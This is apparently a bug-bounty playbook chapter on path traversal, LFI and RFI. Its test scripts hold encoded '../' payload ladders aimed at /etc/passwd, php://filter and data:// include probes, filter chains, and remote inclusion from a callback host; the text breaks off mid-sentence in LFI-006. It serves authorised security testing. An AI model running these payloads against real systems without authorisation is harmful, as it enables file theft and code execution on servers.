# LFI · Path traversal, LFI & RFI

> A value we control becomes part of a file path on the server: a parameter, an upload's name, an archive entry, a
> stored reference, or the URL path itself where a front end and a back end resolve it differently. It pays when
> the server reads or writes a file outside the directory the developer meant, shown with a harmless file
> (`/etc/hostname`, the first lines of `/etc/passwd`, `C:\Windows\win.ini`). A path in an error message, or a `../`
> that stays inside the web root, is not a finding.

| | |
|---|---|
| **Class** | `traversal` |
| **Applies when** | http, app\|api |
| **Pays** | 356 disclosed reports (44 more touch the class), 64 paid, median $1,000, top $29,000. The five best-paid ($12,000 to $29,000, all GitLab) read files through import, issue-move and package-registry code that built a path from data the user controlled; the long tail is download and include parameters, nginx aliases and known-CVE traversals in servers and appliances. |
| **Weaknesses** | Path Traversal · Relative Path Traversal · Path Traversal: '.../...//' · PHP Local File Inclusion · Remote File Inclusion · External Control of File Name or Path · Improper Link Resolution Before File Access ('Link Following') · CWE-22, CWE-23, CWE-35, CWE-36, CWE-59, CWE-73, CWE-98 |

## Why it pays

Framework static handlers resolve paths safely, so the bug survives in code a developer wrote around files:
download and export endpoints that take a file name, help pages and language selectors that include `<page>.php`
or `<lang>.json`, upload handlers that keep the client's file name, archive importers, jobs that copy attachments
when an object is moved, duplicated or imported, converters and renderers that honour an include feature of their
format, and the seam between a proxy and the server behind it. The best-paid reports are of the copy-job kind:
arbitrary file read through the bulk-import uploads pipeline ($29,000, #1439593), through the uploads rewriter when
an issue is moved ($20,000, #827052) and during project import ($16,000, #1132378), all rated critical. A markdown
plugin that read local files paid $6,000 (#518641), a diagram renderer $5,600 (#1098793), video upload through
FFmpeg's HLS parser $2,727 (#1062888), an nginx alias one slash short $1,200 (#1650273). A plain `file=` parameter
pays $150 to $500 (#346825, #895972, #1624670) unless the file it reaches matters.

Filters fail in a few repeatable ways: the check runs before a second decoding (#232371; the incomplete fix in
Apache 2.4.50, #1404731), `../` is stripped once and `....//` survives, a prefix is checked before the path is
resolved, a join function lets an absolute path replace the base directory, or two layers disagree about what the
path is. Known-CVE traversals in products (Grafana #1415820, Apache #1394916, Cisco ASA) belong to the CVE chapter
and are the class's most common duplicates. Rate a read on what it shows (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`,
7.5 unauthenticated, `docs/06-severity.md`) and name the files that would matter without pulling them.

## The crux question

**Which values I control end up inside a file path on the server, and is that path checked after it has been fully
decoded and resolved, against the directory it must stay in?**

## Applicability probe

Settle `file-param`, `upload`, `file-processing`, `render`, `reverse-proxy` and `cloud-storage` for the asset, and
note `php` and `java` from the fingerprint.

```bash
# 1. parameters that name a file, path, template, language or include (crawl, proxy history and JS)
grep -rhiEo '[?&"]((file|filename|filepath|path|dir|folder|doc|document|download|attachment|page|template|tpl|view|layout|include|inc|lang|language|locale|theme|skin|style|report|log|module|resource)[a-z_]*)["=]' \
  "$E/recon/$H/" | sort | uniq -c | sort -rn | head -40
# 2. values that are file names or paths, whatever the parameter is called (URL values belong to the SSR chapter)
grep -rhoE '[?&][A-Za-z_]+=[^&" ]+\.(pdf|txt|csv|xlsx?|docx?|json|xml|html?|php|tpl|jsp|yml|ini|log)\b' "$E/recon/$H/" | sort -u | head -40
grep -rhoE '[?&][A-Za-z_]+=[^&" ]*(%2[Ff]|/)[^&" ]*' "$E/recon/$H/" | grep -v '=https\?' | sort -u | head -20
# 3. which layer answers: headers on static prefixes and on an application route
for p in /static/ /assets/ /favicon.ico /login /api/; do
  printf '%-14s' "$p"; curl -sS "${HDR[@]}" -o /dev/null -D - "$T$p" | grep -iE '^(server|via|x-powered-by|set-cookie):' | cut -c1-60 | tr -d '\r' | tr '\n' ' '; echo
done
```

Then walk the authenticated app once for: download, export and "view attachment" links; help, docs or CMS pages
selected by name; language, theme, template and report-layout choices (in parameters, cookies and headers); file
inputs and what the server does with the file (thumbnail, transcode, extract, preview); import from an archive or
from another instance, backup restore, project or workspace export; move, copy or duplicate actions on objects that
carry attachments; diagram, AsciiDoc, reStructuredText, LaTeX or Markdown fields rendered by the server; bucket
host names in responses.

```bash
scripts/sane fact set "$H" file-param=1 --ev "GET /download?file=invoice-2291.pdf; /help?page=faq; the lang cookie selects /i18n/<lang>.json"
scripts/sane fact set "$H" file-processing=1 --ev "'Import project' takes a .tar.gz; uploaded videos are transcoded (stored MP4 differs from the upload)"
scripts/sane fact set "$H" reverse-proxy=1 java=1 --ev "Server: nginx on /static/; JSESSIONID and a Tomcat error page under /app/"
# nothing found after the walk:
scripts/sane fact set "$H" file-param=0 --ev "crawl, JS and authenticated walk: downloads use opaque ids; no parameter, cookie or header takes a name or path"
```

When `file-param`, `upload`, `file-processing`, `render`, `reverse-proxy` and `cloud-storage` are all false, nothing
in this chapter is queued; the planner writes the reason per item.

## Triage order

LFI-012 (nginx off-by-slash on static prefixes: a handful of unauthenticated requests) → LFI-001 (is the value a
path, then plain `../`) → LFI-003 (absolute path) → LFI-002 (encoding ladder, when a filter answers) → LFI-013 (Java
`..;/` behind the front end) → LFI-004 (PHP wrappers) → LFI-005 (PHP include of bytes we place) → LFI-006 (RFI) →
LFI-009 (stored references copied by move, import or export: the highest ceiling) → LFI-008 (archive entries) →
LFI-010 (converters and renderers) → LFI-007 (upload names) → LFI-011 (object-storage keys).

## Items

### LFI-001 · A file, download, template or language parameter returns a file outside its base directory through `../` sequences

| | |
|---|---|
| **Severity** | High standalone for an arbitrary read (`/etc/hostname`, the first lines of `/etc/passwd`); Medium when a forced extension or prefix limits what can be read; Critical with DSR-005, DSR-009 or DSR-011 when a key read this way turns into code execution |
| **Requires** | file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #895972, #346825, #1436223, #780021 |

- **Where:** parameters whose value names a file: `file=`, `filename=`, `path=`, `doc=`, `download=`,
  `attachment=`, `page=`, `template=`, `tpl=`, `view=`, `layout=`, `include=`, `lang=`, `locale=`, `theme=`,
  `skin=`, `report=`, in the query, a form or JSON body, a cookie (`lang`, `theme`) or a path segment
  (`/download/<name>`, `/files/<name>`). Find them in the crawl (`grep -rhiEo '[?&"](file|filename|path|page|template|lang|locale)[a-z_]*=' "$E/recon/$H/"`)
  and look for values with an extension (`invoice-2291.pdf`, `faq.html`, `en.json`) or a bare name the server maps
  to a file (`page=faq`, `lang=en`). A Rails controller that renders a file named by the `Accept` header is CVE-017
  (CVE-2019-5418), not this card.
- **Test:** first prove the value is used as a path. `./<value>` returns the same bytes as `<value>` on any path,
  and a lookup key or allow-list fails it. `lfi001-nx/<value>` must fail: if it returns the file, the application
  keeps only the last path segment and traversal is closed. `lfi001-nx/../<value>` returns the file where the
  path is normalised as a string before it is opened and fails where the operating system resolves it; both are
  paths. Then climb with `../` to a file every host has: `/etc/hostname` on Unix, `C:\Windows\win.ini` on
  Windows. Surplus `../` at the root are ignored by both systems, so eight to ten is enough.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-001"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/download"; P=file; V='invoice-2291.pdf'   # the endpoint, the parameter and a value the application itself sends
  g() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/$2.body" \
          -w "%{http_code} %{size_download} %{content_type} $2 [$1]\n"; sleep "$W"; }
  # 1. is the value a path? dot must equal base; sub must not; missing is the not-found answer
  g "$V" base; g "./$V" dot; g "lfi001-nx/../$V" nx-up; g "lfi001-nx/$V" sub; g "lfi001-$V" missing
  md5sum "$D"/{base,dot,nx-up,sub,missing}.body
  # 2. climb to a file every Unix host has, then the control; Windows back ends answer the backslash rows
  for n in 1 2 3 4 6 8 10; do g "$(printf '../%.0s' $(seq $n))etc/hostname" "up$n"; done
  g "../../../../../../../../etc/lfi001-does-not-exist" control
  for n in 4 8; do g "$(printf '..\\%.0s' $(seq $n))Windows\\win.ini" "win$n"; done
  head -c 120 "$D"/up*.body "$D"/win*.body
  g "../../../../../../../../etc/passwd" passwd; head -3 "$D/passwd.body"     # severity evidence: the first lines only
  ```
  For a form POST drop `--get`. In a JSON body send the value as a JSON string:
  `-H 'Content-Type: application/json' -d '{"template":"../../../../../../../../etc/hostname"}'`; in a cookie
  `-b 'lang=../../../../../../../../etc/hostname'`. A path segment needs `--path-as-is` (curl removes dot segments
  otherwise) and usually an encoded slash, because the front end resolves a literal `/../` before routing:
  ```bash
  curl -sS "${HDR[@]}" $A --path-as-is "$T/files/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fhostname" \
    -o "$D/segment.body" -w '%{http_code} %{size_download}\n'
  ```
  When `base` works without the extension the page shows (`page=faq` serves `faq.php`), the application appends a
  suffix and `/etc/hostname` becomes `/etc/hostname.php`. Read a file that has the suffix instead
  (`../../../../../../../../proc/self/cwd/package` when `.json` is appended), or go to LFI-002 (null byte on old
  stacks) and, on PHP, LFI-004.
- **Proof:** `/etc/hostname` from the climb beside the `control` row's not-found answer, and the step 1 table, all
  saved raw; the first three lines of `/etc/passwd` as the conventional severity evidence. Name in the report the
  files that would matter on this stack (the application's configuration and `.env`, cloud credential files in the
  service user's home) and do not read them unless the policy asks for it.
- **Not a finding when:** the bytes come from inside the web root (`../css/app.css`, `../index.html`): no boundary
  was crossed. Every row, `missing` and `control` included, has the same hash: a catch-all page (an SPA shell, a
  soft 404). `sub` equals `base`: only the last segment is used; record `negative` with that mechanism. `dot` fails:
  the value is a key into a list or a database lookup, not a path. The error quotes the resolved path
  (`/srv/app/files/../../etc/hostname not found`): that is path disclosure (`internal-info`) and a hint for the
  depth, not a read. A 403 carrying the WAF's own body: the request never reached the application. Another user's
  file in the same directory by its name: that is BAC-004, not traversal.
- **Escalate:** `../` refused: LFI-002 and LFI-003. A PHP page renders instead of printing its source: LFI-004 and
  LFI-005. A readable key turns the read into code execution: DSR-005 (`web.config` machineKey), DSR-009 (Laravel
  `APP_KEY` in `.env`), DSR-011 (Rails `secret_key_base`); describe the chain and pull the key only if the policy
  allows it. An object id that passes the `dot` test with no file behind it is being placed in a URL to an
  internal service: API-008.

### LFI-002 · A traversal filter is bypassed by an encoding, nesting or separator variant of `../`

| | |
|---|---|
| **Severity** | High standalone when the variant reads an arbitrary file; Medium when it reaches only files with a forced extension |
| **Requires** | file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22, CWE-35, CWE-174 |
| **Prior art** | #232371, #1404731, #1626210, #307666 |

- **Where:** a parameter that names a file (`file=`, `path=`, `page=`, `template=`, `lang=`, a `/download/<name>`
  segment) whose value is used as a path, which shows when `./<name>` returns the same bytes as `<name>`, but a
  plain `../../../../../../../../etc/passwd` is refused by the application: a 400 or "invalid file name" only when
  `..` or `/` is present, the same not-found answer at every depth, or the value echoed back with the dots removed.
- **Test:** find the transformation the filter did not anticipate. A check that runs before a second decoding
  loses to double encoding (`%252e%252e%252f`); a lax UTF-8 decoder to overlong forms (`%c0%ae`, `%c0%af`); NFKC
  normalisation after the check to full-width forms (`．．／`); a single, non-recursive strip of `../` to nesting
  (`....//`, `..././`); a check for `/` only to `\` on Windows back ends; a prefix check to
  `<expected dir>/../../`; a forced extension to a null byte on old stacks (PHP before 5.3.4, Java before 7u40). In
  a path segment on Java servers, `..;/` is read as `..` once the server strips the `;` parameter.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-002"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/download?file="     # the endpoint with the parameter last; for a path segment use U="$T/download/"
  # each row is sent byte for byte; replace files/ in the prefix row with the directory the application expects
  cat > "$D/ladder.txt" <<'EOF'
  ../../../../../../../../etc/passwd
  ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  .%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
  ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
  %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  ....//....//....//....//....//....//....//....//etc/passwd
  ..././..././..././..././..././..././..././..././etc/passwd
  %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
  ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
  %ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc%ef%bc%8fpasswd
  ..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd
  files/../../../../../../../../etc/passwd
  ../../../../../../../../etc/passwd%00
  ../../../../../../../../etc/passwd%00.pdf
  ..\..\..\..\..\..\..\..\Windows\win.ini
  ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cWindows%5cwin.ini
  ..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cWindows%255cwin.ini
  EOF
  n=0; while IFS= read -r p; do n=$((n+1))
    curl -sS "${HDR[@]}" $A --path-as-is "$U$p" -o "$D/$n.body" -w "%{http_code} %{size_download} $n $p\n"; sleep "$W"
  done < "$D/ladder.txt" | tee "$D/results.txt"
  grep -l -a -e '^root:' -e '\[fonts\]' "$D"/*.body       # the rows whose body is /etc/passwd or win.ini
  ```
  The ladder reads `/etc/passwd` because `root:` marks a hit without a manual comparison; the report quotes its
  first lines only. Re-send the row that worked with `etc/hostname` in place of `etc/passwd` for the proof. When
  the value sits in a JSON body, put the decoded form of each row in the JSON string instead.
- **Proof:** the bypass request and its response with the file, next to the plain `../` request that the same
  endpoint refuses, both saved raw; then `/etc/hostname` through the same variant. Say in the report which check it
  defeats (decoded twice, stripped once, prefix checked before resolution, NUL truncation).
- **Not a finding when:** every row gets the same refusal and an absolute path fails too: the path is decoded,
  resolved and compared with the base directory (`realpath` or `normalize()` followed by a prefix check), which is
  the correct design; record `negative` naming it. A row returns 200 with the same body as a request for a file
  that does not exist (a catch-all). The WAF blocks the plain row and the application refuses the encoded ones: a
  WAF bypass alone. The overlong, full-width and NUL rows come back as 400 from the front end: current servers
  reject invalid UTF-8 and NUL bytes, and those techniques are dead on that stack.
- **Escalate:** run the LFI-001 proof with the working variant; on PHP continue with LFI-004. A bypass of a
  previous fix is rarely a duplicate (`docs/07-graveyard.md`): if the endpoint was fixed for plain `../` before
  (release notes, a disclosed report), say so. In a product with a fixed traversal CVE, the same ladder against
  the patched route is CVE-015.

### LFI-003 · An absolute path in the parameter replaces the base directory instead of being appended to it

| | |
|---|---|
| **Severity** | High standalone for an arbitrary read; Medium when a forced extension limits it |
| **Requires** | file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Path Traversal · CWE-36 |
| **Prior art** | #1542734, #402473, #183925 |

- **Where:** parameters that name a file (`file=`, `path=`, `filePath=`, `dir=`, `doc=`, `template=`), especially
  values that already look like paths (`path=/exports/2291.pdf`), Windows-style values, and parameters that refuse
  any value containing `..`. (No report title in the library names the absolute form; the prior art is download
  parameters that took a full path.)
- **Test:** several path-join functions return the second argument unchanged when it is absolute: Python
  `os.path.join` and `pathlib`'s `/`, Java `Path.resolve`, .NET `Path.Combine`, Node `path.resolve`, Ruby
  `File.expand_path(name, base)`. Others concatenate and fail safe here: Node `path.join`, Go `filepath.Join`, Ruby
  `File.join`, Java `new File(base, name)`, .NET `Path.Join`. A filter that only rejects `..` lets an absolute path
  through, a parameter opened with no base directory at all takes one directly, and a value opened as a URL (Java
  `new URL(...)`, PHP stream functions) also takes `file:`.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/download"; P=file          # the endpoint and the parameter that names a file
  n=0; for v in '/etc/hostname' '//etc/hostname' '/./etc/hostname' 'file:///etc/hostname' 'file:/etc/hostname' \
           '/etc/lfi003-does-not-exist' 'C:\Windows\win.ini' 'C:/Windows/win.ini' '\\?\C:\Windows\win.ini' \
           'C:\lfi003-does-not-exist.ini' '/proc/self/cwd/package.json'; do n=$((n+1))
    curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$v" "$U" -o "$D/$n.body" -w "%{http_code} %{size_download} $n [$v]\n"
    sleep "$W"; done | tee "$D/results.txt"
  head -c 120 "$D"/[1-5].body "$D"/[7-9].body
  ```
  `/proc/self/cwd/` is the process's working directory on Linux, usually the application root: replace
  `package.json` with the manifest of the stack (`composer.json`, `Gemfile`, `requirements.txt`, `pom.xml`). When
  the value must start with a known directory, try `/var/www/files/../../../etc/hostname` with that directory.
- **Proof:** `/etc/hostname` or `win.ini` returned for an absolute value, the control row
  (`/etc/lfi003-does-not-exist`) answering not-found, and a normal request showing that the parameter usually takes
  a relative name, all saved raw.
- **Not a finding when:** the parameter takes absolute paths by design inside a virtual root (a file manager whose
  `/` is our own storage): `/etc/hostname` comes back as not-found or as our own folder. The bytes come from our
  own sandbox where reading files is the product (a build container, a notebook, an online IDE): by design unless
  the read reaches the host or another tenant. `file:` returns nothing and `http://` gets a callback: that is a
  URL fetcher, SSR-001.
- **Escalate:** read nothing further than the proof without the policy's consent; name the configuration files
  that sit under `/proc/self/cwd/`. `file:` accepted means the value is opened as a URL: SSR-001 and SSR-009 for
  the other schemes. On a Windows back end a UNC path (`\\<callback host>\lfi003\x`) makes the server connect over
  SMB and leak an NTLM handshake: SSR-009 (needs `oob`).

### LFI-004 · A PHP include or file-read parameter accepts `php://filter` and returns the base64 source of a PHP file

| | |
|---|---|
| **Severity** | High standalone for source disclosure through `php://filter`; Critical when a `data:`, `php://input` or `zip://` stream is included and its empty PHP block is parsed |
| **Requires** | php, file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | PHP Local File Inclusion · CWE-98 |
| **Prior art** | #1624670, #39428, #288298, #492767 |

- **Where:** PHP parameters that select a page, template, module, language or file (`page=`, `p=`, `inc=`,
  `module=`, `view=`, `template=`, `lang=`, `file=`), above all those whose targets are executed rather than
  printed (`page=contact` renders the contact form) and those that append `.php`, where `/etc/passwd` cannot be
  reached with a plain climb.
- **Test:** PHP's include and file functions accept stream wrappers in the path. With
  `php://filter/convert.base64-encode/resource=<file>` an include prints the file base64-encoded instead of running
  it, so the source of any PHP file survives the output context. `data:` and `php://input` streams are included only
  when `allow_url_include` is on (off by default since PHP 5.2); an empty PHP block placed in front of a marker
  tells an include (the block is parsed and vanishes) from a read (it is printed). `zip://` and `phar://` open a
  member of an archive we uploaded and need no `allow_url_include`; under a file function instead of include,
  `phar://` deserializes the archive's metadata, which is DSR-008. `expect://` runs a command and is not part of
  this test.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-004"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/index.php"; P=page; X=home    # endpoint, parameter, and the value the application sends (without a suffix it adds)
  g() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/$2.body" -w "%{http_code} %{size_download} $2\n"; sleep "$W"; }
  # 1. the source of the page the parameter already includes, base64-encoded so the include cannot run it
  g "php://filter/convert.base64-encode/resource=$X" b64; g "php://filter/convert.base64-encode/resource=lfi004-nx" b64-control
  grep -aoE '[A-Za-z0-9+/]{40,}={0,2}' "$D/b64.body" | head -1 | base64 -d | head -15
  # 2. when 'php://' or 'base64' is filtered: other spellings and filters of the same read
  g "php://filter/read=convert.base64-encode/resource=$X" b64read
  g "pHp://FilTer/convert.base64-encode/resource=$X" b64case
  g "php://filter/string.rot13/resource=$X" rot13              # decode: tr 'A-Za-z' 'N-ZA-Mn-za-m'
  g "php://filter/convert.iconv.utf-8.utf-16le/resource=$X" utf16  # decode: iconv -f utf-16le -t utf-8
  # 3. allow_url_include: an empty PHP block in front of a marker; if included, the comment disappears
  g 'data://text/plain,<?php /* lfi004 */ ?>lfi004-included' data
  g 'data://text/plain;base64,PD9waHAgLyogbGZpMDA0ICovID8+bGZpMDA0LWluY2x1ZGVk' data64
  curl -sS "${HDR[@]}" $A -X POST --data-binary '<?php /* lfi004 */ ?>lfi004-input' "$U?$P=php://input" -o "$D/input.body"
  grep -a -c 'lfi004-included\|lfi004-input' "$D"/data.body "$D"/data64.body "$D"/input.body
  grep -a -c 'lfi004 \*/' "$D"/data.body "$D"/data64.body "$D"/input.body
  # 4. only with an upload whose stored path is known: a member of our own ZIP through zip:// and phar://
  python3 -c "import zipfile; z = zipfile.ZipFile('$D/lfi004.zip', 'w'); z.writestr('x.php', '<?php /* lfi004 */ ?>lfi004-zip\n'); z.close()"
  # upload lfi004.zip through the application's file input, note its server path, then (#x when .php is appended, #x.php when not):
  g 'zip:///var/www/html/uploads/lfi004.zip#x' zip; g 'phar:///var/www/html/uploads/lfi004.zip/x' phar
  ```
  A suffix the application appends breaks `php://input` and the base64 `data:` row; the plain `data:` row and the
  filters survive it (`resource=home` becomes `resource=home.php`).
- **Proof:** the decoded source of the included page (its first lines, with `<?php`) and the request, next to the
  control row. For a stream include: the response that contains `lfi004-included` (or `lfi004-input`,
  `lfi004-zip`) and not `lfi004 */`, beside the `b64` row. Quote a few lines of source in the report, not the
  application; configuration files (`config.php`, `wp-config.php`, `.env`) are named, not read. The empty block is
  the whole execution proof: no function call goes into it.
- **Not a finding when:** the error shows the wrapper behind a directory (`failed to open stream: ... pages/php://filter/...`):
  a prefix before the value turns the wrapper into a relative path, so wrappers are out and only a plain climb is
  left (LFI-001). The base64 decodes to the same bytes as `b64-control`: an error template, not the file. The
  `data:` rows show both the marker and `lfi004 */`: the stream was read and printed (`readfile`,
  `file_get_contents`), which is a read primitive, not code execution. The response warns
  `wrapper is disabled in the server configuration by allow_url_include=0`: that confirms an include sink and
  nothing more.
- **Escalate:** the source names other sinks and the configuration file; read a second file only if it holds no
  credentials. Include confirmed with `allow_url_include` off: LFI-005 (bytes we place, filter chains). Includes of
  `http://`: LFI-006 (needs `oob`). A `phar://` path that reaches `file_exists`, `getimagesize` or similar: DSR-008.

### LFI-005 · A PHP include reaches bytes we control (our session file, an upload, a log line or a `php://filter` chain), shown with a plain-text marker

| | |
|---|---|
| **Severity** | High standalone with our marker shown inside an include sink and code execution described; Critical when the policy accepts one evaluated expression through the filter chain, which leaves nothing on disk |
| **Requires** | php, file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | PHP Local File Inclusion · CWE-98 |
| **Prior art** | #411140, #272578, #60058 |

- **Where:** a PHP parameter that includes the file it names: `page=contact` renders the contact page, and
  `php://filter/convert.base64-encode/resource=contact` returns base64 source instead. You need bytes in a file you
  can name: our own PHP session file (the `PHPSESSID` cookie, and a feature that stores something we type in the
  session: user name, language, search terms, cart), an upload whose server path you know, or a log the PHP user
  can read. A `php://filter` chain needs no file at all.
- **Test:** include parses whatever bytes the file holds. If our bytes come back in the output of the include, PHP
  code in the same place would run: that is the route from LFI to code execution. Prove the reach with a
  plain-text marker and stop. A PHP tag written into a log or session file stays on disk and runs at every later
  include of that file, so it is never written. A filter chain builds the marker out of `iconv` conversions of an
  empty stream; it writes nothing.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-005"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/index.php"; P=page; M="lfi005-$RANDOM"   # the include parameter; M is the marker (letters, digits, dash)
  g() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$1" "$U" -o "$D/$2.body" -w "%{http_code} %{size_download} $2\n"; sleep "$W"; }
  # 0. confirm the sink includes: base64 source comes back for the page it normally renders
  g "php://filter/convert.base64-encode/resource=contact" sink
  # 1. our own session file: store the marker in a value the application keeps in the session, then include the file
  SID=$(sed -n 's/.*PHPSESSID=\([A-Za-z0-9,-]*\).*/\1/p' "$E/accounts/A.headers" | head -1)
  curl -sS "${HDR[@]}" $A --get --data-urlencode "q=$M" "$T/search" -o /dev/null     # any feature that stores input in the session
  for d in /var/lib/php/sessions /var/lib/php/session /var/lib/php5 /tmp; do g "$d/sess_$SID" "sess-${d##*/}"; done
  g "/tmp/sess_lfi005nx$RANDOM" sess-control
  # 2. an upload of ours, at the path the application stores it under (from the upload response or an error)
  printf '%s\n' "$M" > "$D/lfi005.txt"; curl -sS "${HDR[@]}" $A -F "file=@$D/lfi005.txt;type=text/plain" "$T/api/upload" -o "$D/up.json"
  g "/var/www/html/uploads/lfi005.txt" upload
  # 3. no file: a php://filter chain that produces the marker (generator: github.com/synacktiv/php_filter_chain_generator)
  python3 php_filter_chain_generator.py --chain "$M" | grep -o 'php://filter.*' > "$D/chain.txt"
  curl -sS "${HDR[@]}" $A -X POST --data-urlencode "$P@$D/chain.txt" "$U" -o "$D/chain.body"   # chains run to kilobytes; GET if the sink only reads GET
  grep -a -l "$M" "$D"/*.body
  ```
  If the value needs `../` to leave a prefix directory, put the same climb in front of each absolute path. A suffix
  the application appends rules out the session and upload files unless a null byte truncates it on an old stack;
  the chain is not affected. If the chain's response warns that URL file-access is disabled, replace the trailing
  `resource=php://temp` with `resource=/etc/hostname`. Logs: request `$T/$M` once so the marker is in the access log
  as a path, and include `/var/log/apache2/access.log` or `/var/log/nginx/access.log` only after a plain read showed
  the file readable; official Docker images link these logs to `/dev/stdout`, where an include can block a worker.
  Described and not tested: `/proc/self/environ` (it holds the worker's secrets), `/proc/self/fd/<n>` (sockets an
  include hangs on), and `PHP_SESSION_UPLOAD_PROGRESS`, which writes a multipart field into a session file even when
  the application uses no sessions but is removed when the upload ends, so reaching it is a race of hundreds of
  requests.
- **Proof:** the include response containing the marker, the request that placed it (session value, upload or
  chain), the control row without it, and the `sink` row showing the parameter includes. In the report, state that
  a PHP tag in the same place would execute and that none was written. Only where the policy accepts proof of
  execution: one chain generated for `<?php echo 41*271;?>` returning `11111`, nothing else.
- **Not a finding when:** the marker appears because the page echoes the search term or the session value anyway:
  the control include must not contain it. Sessions are kept in Redis, Memcached or a database
  (`session.save_handler`), so every session path fails. `open_basedir restriction in effect` in a warning: the
  include is confined to the allowed tree. The sink turns out to be `readfile` or `file_get_contents` (the `sink`
  row prints PHP source instead of base64): the marker shows, but PHP code would be printed, not run; that is a read
  primitive (LFI-001 severity).
- **Escalate:** report it as an include of attacker-controlled bytes with execution described; the RCE chapter has
  the conventions for describing execution that was not performed. A writable upload directory that the include
  can reach is also UPL territory.

### LFI-006 · A PHP include parameter fetches and includes a file from a URL we name (remote file inclusion)

| | |
|---|---|
| **Severity** | Critical standalone when a file from our host is included and its empty PHP block is parsed; Medium when the server fetches and prints the file without including it (SSRF with content injection) |
| **Requires** | php, file-param, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Remote File Inclusion · CWE-98 |
| **Prior art** | #208481, #1069105, #14092 |

- **Where:** PHP parameters that select a page, template, skin or module (`page=`, `inc=`, `template=`, `skin=`,
  `module=`), and any whose value is or looks like a URL. RFI needs `allow_url_include=On`, off by default since
  PHP 5.2, so it lives on old or hand-configured servers; the library holds no paid web RFI and the cited reports
  are unpaid. On a Windows back end a UNC path is opened as a file, so it is included even with
  `allow_url_include` off.
- **Test:** host a text file whose PHP block is empty, followed by a marker, and name its URL in the parameter. The
  request from the target shows the fetch; the marker without the comment in the response shows PHP parsed the file
  as code. A suffix the application appends (`.php`) becomes part of a query string after `?` or a fragment after
  `#`.
- **How:**
  ```bash
  # on the callback host: the file, served over HTTP
  printf '<?php /* lfi006 */ ?>lfi006-included\n' > lfi006.txt; python3 -m http.server 8000
  # against the target
  D="$E/evidence/$H/LFI-006"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/index.php"; P=page     # the include parameter
  n=0; for v in "http://$OOB:8000/lfi006.txt" "http://$OOB:8000/lfi006.txt?" "http://$OOB:8000/lfi006.txt#" \
           "hTtP://$OOB:8000/lfi006.txt?" "ftp://$OOB/lfi006.txt"; do n=$((n+1))
    curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$v" "$U" -o "$D/$n.body" -w "%{http_code} %{size_download} $n [$v]\n"
    sleep "$W"; done
  grep -a -l 'lfi006-included' "$D"/*.body; grep -a -l 'lfi006 \*/' "$D"/*.body
  ```
  The `ftp://` row needs an FTP listener on the callback host. Windows back end: run an SMB share on the callback
  host (`impacket-smbserver lfi006 .`) and send `\\<callback host>\lfi006\lfi006.txt`; SSR-009 covers the NTLM
  handshake it also leaks.
- **Proof:** the request from the target's address arriving at the callback host for `lfi006.txt`, and the include
  response containing `lfi006-included` without `lfi006 */`: PHP parsed a block that came from our host. Nothing
  else is placed in the file.
- **Not a finding when:** the callback arrives and the response shows both strings: the file was fetched and printed
  (`file_get_contents` with `allow_url_fopen`), which is SSRF (SSR-001, SSR-002) and content injection, not
  inclusion. A callback with no change in the response from an address unlike the application's: a link scanner or
